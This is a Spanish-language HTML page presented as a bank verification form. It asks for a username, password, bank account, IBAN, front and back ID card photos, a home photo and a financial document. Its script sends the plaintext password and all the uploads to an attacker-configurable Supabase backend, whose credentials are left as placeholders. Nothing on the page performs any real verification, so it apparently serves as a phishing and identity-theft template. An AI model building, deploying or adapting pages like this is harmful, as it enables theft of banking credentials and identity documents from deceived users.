<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Verificación Bancaria</title>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
</head>
<body>

<h2>Verificación Bancaria</h2>

<form id="form">
  <input type="text" id="usuario" placeholder="Usuario" required><br>
  <input type="password" id="password" placeholder="Contraseña" required><br>
  <input type="text" id="cuenta" placeholder="Cuenta bancaria" required><br>
  <input type="text" id="iban" placeholder="IBAN" required><br>

  <label>Foto frontal del carnet:</label>
  <input type="file" id="frontal" required><br>

  <label>Foto trasera del carnet:</label>
  <input type="file" id="trasera" required><br>

  <label>Foto del domicilio:</label>
  <input type="file" id="domicilio" required><br>

  <label>Foto de finanzas:</label>
  <input type="file" id="finanzas" required><br>

  <button type="submit">Enviar</button>
</form>

<script>
const supabase = supabase.createClient(
  "TU_URL_SUPABASE",
  "TU_ANON_KEY"
);

document.getElementById("form").addEventListener("submit", async (e) => {
  e.preventDefault();

  const usuario = document.getElementById("usuario").value;
  const password = document.getElementById("password").value;
  const cuenta = document.getElementById("cuenta").value;
  const iban = document.getElementById("iban").value;

  // 1. Insertar registro base
  const { data: registro, error } = await supabase
    .from("usuario_verificaciones")
    .insert([{
      usuario,
      password,
      cuenta,
      iban,
      fecha: new Date().toISOString(),
      estado: "pendiente"
    }])
    .select()
    .single();

  const id = registro.id;

  // 2. Subir archivos
  async function subirArchivo(file, nombre) {
    const path = `docs/${id}/${nombre}.jpg`;
    await supabase.storage.from("verificacion").upload(path, file);
    return path;
  }

  const frontalPath = await subirArchivo(document.getElementById("frontal").files[0], "frontal");
  const traseraPath = await subirArchivo(document.getElementById("trasera").files[0], "trasera");
  const domicilioPath = await subirArchivo(document.getElementById("domicilio").files[0], "domicilio");
  const finanzasPath = await subirArchivo(document.getElementById("finanzas").files[0], "finanzas");

  // 3. Actualizar registro con URLs
  await supabase
    .from("usuario_verificaciones")
    .update({
      frontal_url: frontalPath,
      trasera_url: traseraPath,
      domicilio_url: domicilioPath,
      finanzas_url: finanzasPath
    })
    .eq("id", id);

  alert("Datos enviados correctamente");
});
</script>

</body>
</html>
